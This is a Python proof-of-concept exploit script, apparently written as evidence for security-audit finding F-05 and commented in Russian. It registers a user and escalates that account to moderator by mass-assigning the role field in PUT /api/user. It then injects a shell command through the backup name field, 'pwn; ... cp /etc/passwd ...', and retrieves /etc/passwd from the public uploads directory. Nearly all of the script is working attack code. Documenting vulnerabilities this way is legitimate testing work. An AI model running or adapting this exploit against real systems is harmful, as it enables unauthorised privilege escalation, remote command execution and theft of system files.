# -*- coding: utf-8 -*-
"""F-05. PUT /api/user принимает role=moderator.
Дальше POST /api/user/backup склеивает имя файла в sh -c.
Доказательство: /etc/passwd появляется по публичному /uploads/.
"""
import time

from _http import Client, parser


def main():
    p = parser("Своя роль moderator и выполнение команды в backup")
    args = p.parse_args()
    client = Client(args.base)
    stamp = str(int(time.time()))[-6:]
    name = f"rce{stamp}"
    email = f"{name}@poc.local"
    password = "Passw0rd!rce"
    token = client.register(name, email, password)

    status, data, raw = client.call(
        "PUT",
        "/api/user",
        token=token,
        body={"user": {"username": name, "email": email, "password": password, "role": "moderator"}},
    )
    if status != 200 or data["user"]["role"] != "moderator":
        raise SystemExit(f"роль не сменилась: {status} {raw[:300]!r}")
    token = data["user"]["token"]

    proof = f"poc-rce-{stamp}.txt"
    payload = f"pwn; mkdir -p /srv/media/uploads; cp /etc/passwd /srv/media/uploads/{proof} #"
    status, data, raw = client.call(
        "POST",
        "/api/user/backup",
        token=token,
        body={"backup": {"name": payload}},
    )
    if status != 200:
        raise SystemExit(f"backup не выполнился: {status} {raw[:300]!r}")

    status, _, body = client.call("GET", f"/uploads/{proof}")
    text = body.decode("utf-8", "replace")
    if status != 200 or not text.startswith("root:"):
        raise SystemExit(f"файл не отдался: {status} {text[:120]!r}")
    print(f"OK role=moderator файл=/uploads/{proof}")
    print("\n".join(text.splitlines()[:3]))


if __name__ == "__main__":
    main()
